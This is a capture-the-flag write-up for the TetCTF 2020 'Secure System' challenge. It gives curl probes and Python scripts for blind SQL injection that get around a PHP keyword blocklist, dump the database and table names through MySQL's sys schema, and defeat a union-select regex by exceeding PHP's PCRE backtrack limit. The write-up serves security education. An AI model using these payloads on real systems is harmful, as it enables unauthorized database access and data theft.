# Description:  
Super tough & Great SQL Injection Challenge which i personally loved it as i
learned a ton through this challenge. We have a form validating user id's and
source code is given.

```php  
fetch_assoc()['yyyyyyyyyyyyyyyyyyyy']; //Sorry It's our secret, can't share  
?>

  
  
  
  
<center>  
Security Check!!! Please enter your ID to prove who are you !!!:  
<form action="index.php" method="POST">  
       <input name="id" value="" />  
  
       <input type="submit" value="Submit" />  
</form>  
</center>

fetch_assoc()['username'];  
               if($user!=='admin')  
               {  
                       echo 'Hello '.htmlentities($user);  
                       if($user==='admin')  
                       {  
                               echo 'This can\'t be =]] Just put here for fun lul';  
                               die($flag);  
                       }  
               }  
       }  
}  
?>  
```  
We could see hard stops blocking ``and|or|in|if|case|sleep|benchmark`` and
more hard part is ``union select`` eggressive check.  
It matches anything. ``Ex: union/*bla*/select``

We can also see there are loops which doesn't make sense. we can't get flag
any way through id it seems. So we have to identify and exploit sql injection.

# Approach:  
I started identifying injection as we don't see any prepared statement like
``select * from users where id=?``

As ``and, or`` are blocked i can use ``&&`` to check injection quickly.

```css  
root@MrR3boot:~# curl -X POST http://45.77.240.178:8002/index.php -d "id=2 %26%26 1=2" 2>/dev/null | tail -1   
Hello  
root@MrR3boot:~# curl -X POST http://45.77.240.178:8002/index.php -d "id=2 %26%26 1=1" 2>/dev/null | tail -1   
Hello guest  
```

As ``order by`` blocked i can go ahead with ``group by`` or ``having`` to
identify the number of columns that are selected in the query.

```css  
root@MrR3boot:~# curl -X POST http://45.77.240.178:8002/index.php -d "id=2 group by 1" 2>/dev/null | tail -1   
Hello guest  
root@MrR3boot:~# curl -X POST http://45.77.240.178:8002/index.php -d "id=2 group by 3" 2>/dev/null | tail -1   
Hello guest  
root@MrR3boot:~# curl -X POST http://45.77.240.178:8002/index.php -d "id=2 group by 4" 2>/dev/null | tail -1 

root@MrR3boot:~#  
```

As you see we got 3 columns that are selected in the query. I tried long
enough time to bypass the union select regex but i couldn't (but i did in the
end) so i went identifying altenative ways like using ``exists``

```css  
root@MrR3boot:~# curl -X POST http://45.77.240.178:8002/index.php -d "id=2 %26%26 exists(select database())" 2>/dev/null | tail -1   
Hello guest  
root@MrR3boot:~# curl -X POST http://45.77.240.178:8002/index.php -d "id=2 %26%26 length(database())<12" 2>/dev/null | tail -1   
Hello guest  
root@MrR3boot:~# curl -X POST http://45.77.240.178:8002/index.php -d "id=2 %26%26 length(database())<10" 2>/dev/null | tail -1   
Hello  
root@MrR3boot:~# curl -X POST http://45.77.240.178:8002/index.php -d "id=2 %26%26 length(database())=10" 2>/dev/null | tail -1   
Hello guest  
```  
So quickly i was able to find the length of database which is ``10``. Then i
started making a script to bruteforce char by char using ``substr`` function
in mysql.

Another hurdle here is MySQL is case insensitive language and like operator
also didn't check the casing. So if we don't identify table/database name
properly including lower/upper case we can't pitch further into the challenge.
One way we could check that is using ``BINARY`` but as its having ``IN`` we
can't use it. other way is to use ``COLLATION`` again those have ``IN`` ex:
latin we can't use them as well. I ended up eating lot of time searching for
ways and useful functions in MySQL. Finally i could use ascii on both sides to
convert them to decimal and then check properly.

Payload is as  
``2 && ascii(substr(database(),{},10))=ascii("{}")``

```python  
import requests  
from string import printable

url='http://45.77.240.178:8002/index.php'

def dump_database():  
	j=1  
	result=''  
	while j<=10:  
		#length of database can be found using : 2 && length(database())<11  
		for i in printable:  
				if i!='%':  
					r = requests.post(url,headers={'Content-Type':'application/x-www-form-urlencoded'},data={'id':'2 && ascii(substr(database(),{},10))=ascii("{}")'.format(j,i)},proxies={'http':'http://127.0.0.1:8080'})  
					if 'guest' in r.text:  
						result=result+i  
						print '[+] Database Name : {}'.format(result)  
						break  
		j+=1

dump_database()  
```

which shows result as  
```css  
root@MrR3boot:~# python do.py  
[+] Database Name : o  
[+] Database Name : ow  
[+] Database Name : owl  
[+] Database Name : owl_  
[+] Database Name : owl_d  
[+] Database Name : owl_do  
[+] Database Name : owl_don  
[+] Database Name : owl_donk  
[+] Database Name : owl_donke  
[+] Database Name : owl_donkey  
```  
Now we have database name and next step is to identify ``table names``. But
HOW ?

We see ``in`` keyword blocked where we can't use
``information_schema|innodb``. After hours and hours of searching online we
could read about ``sys`` database which comes with ``MySQL Community
Edition``.

After digging around i've found this reference
https://dev.mysql.com/doc/refman/8.0/en/sys-schema-object-index.html which
states about which table does what. This helped a lot in identifying a table
which has all table names indexed in it.

So i crafted a payload like ``2 && length((select table_name from
sys.x$schema_table_statistics where table_schema=database() limit 0,1))=5`` to
find the tablename length then found two responses for below requests.

```  
POST /index.php HTTP/1.1  
Host: 45.77.240.178:8002  
Connection: close  
Accept-Encoding: gzip, deflate  
Accept: */*  
User-Agent: python-requests/2.21.0  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 119

id=2%26%26+length((select+table_name+from+sys.x$schema_table_statistics+where+table_schema%3ddatabase()+limit+0,1))+<+6

HTTP/1.1 200 OK  
Date: Tue, 07 Jan 2020 20:15:39 GMT  
Server: Apache/2.4.29 (Ubuntu)  
Vary: Accept-Encoding  
Content-Length: 250  
Connection: close  
Content-Type: text/html; charset=UTF-8

  
  
  
  
<center>  
Security Check!!! Please enter your ID to prove who are you !!!:  
<form action="index.php" method="POST">  
       <input name="id" value="" />  
  
       <input type="submit" value="Submit" />  
</form>  
</center>

Hello guest  
```

same way we can find other table name lengths. I only found 2 tables of which
``5 & 25`` lengths. We can easily guess first table name as ``users`` which is
of `5` char length.

```python  
def dump_tablenames():  
	result=''  
	j=1  
	while j<=25:  
		for i in printable:  
			# length of table 1 is :  2 && length((select table_name from sys.x$schema_table_statistics where table_schema=database() limit 0,1))=5 we can guess its users  
			#second table length is : 2 && length((select table_name from sys.x$schema_table_statistics where table_schema=database() limit 1,1))=25  
			if i!='%':  
				r = requests.post(url,headers={'Content-Type':'application/x-www-form-urlencoded'},data={'id':'2 && ascii(substr((select table_name from sys.x$schema_table_statistics where table_schema=database() limit 1,1),{},25))=ascii("{}")'.format(j,i)})  
				if 'guest' in r.text:  
					result=result+i  
					print '[+] Table Name : {}'.format(result)  
					break  
		j+=1  
```

which dumps the table names

```css  
root@MrR3boot:~# python do.py  
1. Dump Database Name  
2. Find Table Names  
> 2  
[+] Table Name : T  
[+] Table Name : Th  
[+] Table Name : Th1  
[+] Table Name : Th1z  
[+] Table Name : Th1z_  
[+] Table Name : Th1z_F  
[+] Table Name : Th1z_Fa  
[+] Table Name : Th1z_Fac  
[+] Table Name : Th1z_Fack  
[+] Table Name : Th1z_Fack1  
[+] Table Name : Th1z_Fack1n  
[+] Table Name : Th1z_Fack1n_  
[+] Table Name : Th1z_Fack1n_F  
[+] Table Name : Th1z_Fack1n_Fl  
[+] Table Name : Th1z_Fack1n_Fl4  
[+] Table Name : Th1z_Fack1n_Fl44  
[+] Table Name : Th1z_Fack1n_Fl444  
[+] Table Name : Th1z_Fack1n_Fl4444  
[+] Table Name : Th1z_Fack1n_Fl4444g  
[+] Table Name : Th1z_Fack1n_Fl4444g_  
[+] Table Name : Th1z_Fack1n_Fl4444g_T  
[+] Table Name : Th1z_Fack1n_Fl4444g_Ta  
[+] Table Name : Th1z_Fack1n_Fl4444g_Tab  
[+] Table Name : Th1z_Fack1n_Fl4444g_Tabl  
[+] Table Name : Th1z_Fack1n_Fl4444g_Tabl3  
```  
Then i started looking for a way to dump the columns but i didn't find any way
from mysql documentation. After some hours reading through bunch of docs i
could see used queries are stored in sys.statement_analysis table from
https://dev.mysql.com/doc/refman/8.0/en/sys-statement-analysis.html  
But as we know how CTF stuff is 1000's of queries been sent to server and we
can't blindly go for bruteforce on them. Then i stopped here knowing table
name and couldn't progress further. After poking challenge author, he
mentioned about PHP and Regex issue. Then after an hour or so i figured out
https://bugs.php.net/bug.php?id=70699

If we cross the php pcre backtrace limit
(1000000)(https://www.php.net/manual/en/pcre.configuration.php) we can defeat
the preg_match step. I did same.

```css  
root@MrR3boot:~# php -a  
Interactive mode enabled

php > echo preg_match('/((A)+)/', str_repeat('A', 1363)) ? 1 : 0, PHP_EOL;  
1  
php > echo preg_match('/((A)+)/', str_repeat('A', 13631)) ? 1 : 0, PHP_EOL;  
0  
php > echo preg_match('/((A)+)/', str_repeat('A', 136311)) ? 1 : 0, PHP_EOL;  
0  
php >  
```  
This is how it is in action. Now using this behavior we can easily bypass
union select regex check.

```python  
def union_bypass():  
 payload = 'union/*'+'a'*1000000+'*/select 1,2,3-- -'  
	r = requests.post(url,headers={'Content-Type':'application/x-www-form-urlencoded'},data={'id':'-2 {}'.format(payload)},proxies={'http':'http://127.0.0.1:8080'})  
	print r.text  
 ```  
Output is  
```html  
  
  
  
  
<center>  
Security Check!!! Please enter your ID to prove who are you !!!:  
<form action="index.php" method="POST">  
       <input name="id" value="" />  
  
       <input type="submit" value="Submit" />  
</form>  
</center>

Hello 2  
```

Now we can print flag without knowing column_name (That's the beauty if we
have Union)

```python  
def union_bypass():  
	#payload = 'union/*'+'a'*1000000+'*/select 1,2,3-- -'  
	payload='union/*'+'a'*1000000+'*/select 1,(select b from (select 1 as a, 2 as b union/*'+'a'*1000000+'*/select * from Th1z_Fack1n_Fl4444g_Tabl3) bbb limit 1,1),3-- -'  
	r = requests.post(url,headers={'Content-Type':'application/x-www-form-urlencoded'},data={'id':'-2 {}'.format(payload)},proxies={'http':'http://127.0.0.1:8080'})  
	print r.text  
```

Outcome is

```css  
root@MrR3boot:~# python do.py  
1. Dump Database Name  
2. Find Table Names  
3. Union Bypass (PHP & RegEx Bug)  
> 3

  
  
  
  
<center>  
Security Check!!! Please enter your ID to prove who are you !!!:  
<form action="index.php" method="POST">  
       <input name="id" value="" />  
  
       <input type="submit" value="Submit" />  
</form>  
</center>

Hello TetCTF{0wl_d0nkey_means_Liarrrrrrr}  
```  

Original writeup
(https://github.com/MrR3boot/CTF/tree/master/TetCTF-2020/Secure-System).